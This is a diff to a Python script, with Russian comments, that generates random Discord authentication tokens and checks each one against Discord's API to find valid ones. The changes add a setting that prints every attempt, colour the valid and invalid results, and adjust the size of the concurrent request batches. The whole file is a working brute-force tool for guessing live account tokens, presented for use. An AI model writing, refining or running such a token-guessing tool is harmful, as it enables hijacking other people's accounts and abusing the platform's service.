@@ -10,6 +10,12 @@ from art import tprint
 from colorama import Fore
 from plyer import notification
 
+# Если True, выводит в консоль все сгенерированные токены, если False, то только валидные
+# Отключение немного ускоряет работу скрипта 
+PRINT_ALL_TOKENS = True 
+
+
+
 tprint(f"TOKEN GENERATOR", font='modular')
 
 def gen_first():
@@ -30,27 +36,24 @@ url = "https://discordapp.com/api/v6/users/@me/library"
 async def check(token, session):
     async with session.get(url, headers={'Content-Type': 'application/json', 'authorization': token}) as res:
         if res.status != 200:
-            # return f"{token} : INVALID"
-            pass
+            if PRINT_ALL_TOKENS:
+                return f"{Fore.RED}{token} : INVALID{Fore.RESET}"
+            return "В пачке нет валидных токенов."
         elif res.status == 200:
-            return f"{token} : VALID"
+            return f"{Fore.GREEN}{token} : VALID{Fore.RESET}"
 
 async def main():
     async with aiohttp.ClientSession() as session:
         for i in range(10):
             tasks = []
-            for j in range(1000):
+            for j in range(100):
                 token = f"{gen_first()}.{gen_second()}.{gen_third()}"
                 tasks.append(asyncio.ensure_future(check(token, session)))
             tokens = set(await asyncio.gather(*tasks))
-            if len(tokens) == 1:
-                print("В пачке нет действительных токенов.")
-            else:
-                for token in tokens:
-                    print(token)
+            for token in tokens:
+                print(token)
         
 if __name__ == "__main__":
     start_time = time.time()
     asyncio.get_event_loop().run_until_complete(main())
-    print("--- %s seconds ---" % (time.time() - start_time))
-    # asyncio.get_event_loop().close()
+    print(f"{Fore.YELLOW}--- {time.time() - start_time} seconds ---{Fore.RESET}")
